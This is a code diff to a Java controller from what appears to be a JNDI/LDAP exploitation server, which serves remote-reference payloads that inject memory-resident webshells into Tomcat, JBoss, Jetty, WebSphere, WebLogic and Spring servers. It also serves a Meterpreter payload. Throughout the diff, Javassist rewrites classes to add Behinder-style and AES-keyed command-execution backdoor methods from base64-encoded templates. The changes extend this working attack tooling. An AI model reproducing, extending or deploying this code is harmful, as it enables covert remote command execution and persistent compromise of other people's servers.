@@ -7,14 +7,8 @@ import com.nu1r.jndi.gadgets.utils.Utils;
 import com.nu1r.jndi.template.*;
 import com.nu1r.jndi.template.Weblogic.WeblogicMemshellTemplate1;
 import com.nu1r.jndi.template.Weblogic.WeblogicMemshellTemplate2;
-import com.nu1r.jndi.template.Websphere.WSFMSFromThread;
 import com.nu1r.jndi.template.Websphere.WebsphereMemshellTemplate;
-import com.nu1r.jndi.template.jboss.JBSMSFromContextS;
-import com.nu1r.jndi.template.jboss.JBFMSFromContextF;
-import com.nu1r.jndi.template.jetty.JFMSFromJMXF;
-import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
 import com.nu1r.jndi.template.spring.SpringInterceptorMS;
-import com.nu1r.jndi.template.tomcat.*;
 import com.nu1r.jndi.utils.Config;
 import com.nu1r.jndi.utils.Util;
 import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
@@ -32,8 +26,8 @@ import static org.fusesource.jansi.Ansi.ansi;
 @LdapMapping(uri = {"/basic"})
 public class BasicController implements LdapController {
     //最后的反斜杠不能少
-    private String      codebase = Config.codeBase;
-    private PayloadType type;
+    private final String      codebase = Config.codeBase;
+    private       PayloadType type;
     private String[]    params;
 
     @Override
@@ -41,8 +35,8 @@ public class BasicController implements LdapController {
         System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with basic remote reference payload|@"));
         Entry     e         = new Entry(base);
         String    className = "";
-        CtClass   ctClass   = null;
-        ClassPool pool      = ClassPool.getDefault();
+        CtClass   ctClass;
+        ClassPool pool;
 
 
         switch (type) {
@@ -76,6 +70,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromJMXF");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case tomcatfilterth:
                 className = "TFMSFromThreadF";
@@ -83,6 +78,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromThreadF");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case tomcatlistenerjmx:
                 className = "TLMSFromJMXLi";
@@ -90,6 +86,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromJMXLi");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case tomcatlistenerth:
                 className = "TLMSFromThreadLi";
@@ -97,6 +94,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromThreadLi");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case tomcatservletjmx:
                 className = "TSMSFromJMXS";
@@ -104,6 +102,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromJMXS");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case tomcatservletth:
                 className = "TSMSFromThreadS";
@@ -111,6 +110,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromThreadS");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case jbossfilter:
                 className = "JBFMSFromContextF";
@@ -118,6 +118,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBFMSFromContextF");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case jbossservlet:
                 className = "JBSMSFromContextS";
@@ -125,6 +126,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBSMSFromContextS");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case weblogicmemshell1:
                 className = WeblogicMemshellTemplate1.class.getName();
@@ -136,7 +138,6 @@ public class BasicController implements LdapController {
                 className = WebsphereMemshellTemplate.class.getName();
                 break;
             case springinterceptor:
-                byte[] classBytes = new byte[0];
                 pool = ClassPool.getDefault();
                 ctClass = pool.get("com.nu1r.jndi.template.spring.SpringInterceptorMS");
                 String target = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
@@ -163,6 +164,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.jetty.JFMSFromJMXF");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case jettyservlet:
                 className = "JSMSFromJMXS";
@@ -170,6 +172,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.jetty.JSMSFromJMXS");
                 insertKeyMethod(ctClass, "bx");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case wsfilter:
                 className = "WSFMSFromThread";
@@ -177,6 +180,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.Websphere.WSFMSFromThread");
                 insertKeyMethod(ctClass, "ws");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case tomcatexecutor:
                 className = "TWSMSFromThread";
@@ -184,6 +188,7 @@ public class BasicController implements LdapController {
                 ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TWSMSFromThread");
                 insertKeyMethod(ctClass, "execute");
                 ctClass.setName(className);
+                className = ctClass.getName();
                 break;
             case meterpreter:
                 className = Meterpreter.class.getName();
@@ -243,17 +248,6 @@ public class BasicController implements LdapController {
     }
 
 
-    /**
-     * 测试内存马写入是否正确
-     * @param args
-     * @throws Exception
-     */
-    public static void main(String[] args) throws Exception {
-        ClassPool pool      = ClassPool.getDefault();
-        CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromJMXS");
-        insertKeyMethod(ctClass,"bx");
-    }
-
     public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {
 
         // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
@@ -282,6 +276,12 @@ public class BasicController implements LdapController {
             }
         }
 
+        CtClass supClass = ctClass.getSuperclass();
+        if (supClass != null && supClass.getName().equals("org.apache.tomcat.util.threads.ThreadPoolExecutor")) {
+            method = "execute";
+            isTomcat = false;
+        }
+
         switch (type) {
             // 冰蝎类型的内存马
             case "bx":
@@ -300,7 +300,11 @@ public class BasicController implements LdapController {
                 insertMethod(ctClass, method, Utils.base64Decode(WS_SHELL));
                 break;
             case "execute":
-                ctClass.addField(CtField.make("public static String TAG = \"su18\";", ctClass));
+                ctClass.addField(CtField.make("public static final String DEFAULT_SECRET_KEY = \"nu1r\";", ctClass));
+                ctClass.addField(CtField.make("private static final String AES = \"AES\";", ctClass));
+                ctClass.addField(CtField.make("private static final byte[] KEY_VI = \"nu1r\".getBytes();", ctClass));
+                ctClass.addField(CtField.make("private static final String CIPHER_ALGORITHM = \"AES/CBC/PKCS5Padding\";", ctClass));
+                ctClass.addField(CtField.make("private static java.util.Base64.Decoder base64Decoder = java.util.Base64.getDecoder();", ctClass));
                 insertCMD(ctClass);
                 ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_REQUEST), ctClass));
                 ctClass.addMethod(CtMethod.make(Utils.base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
@@ -325,6 +329,7 @@ public class BasicController implements LdapController {
      * @throws Exception 抛出异常
      */
     public static void insertCMD(CtClass ctClass) throws Exception {
+        ctClass.addMethod(CtMethod.make(Utils.base64Decode(DECODE), ctClass));
         ctClass.addMethod(CtMethod.make(Utils.base64Decode(TO_CSTRING_Method), ctClass));
         ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_BY_CLASS), ctClass));
         ctClass.addMethod(CtMethod.make(Utils.base64Decode(GET_METHOD_AND_INVOKE), ctClass));
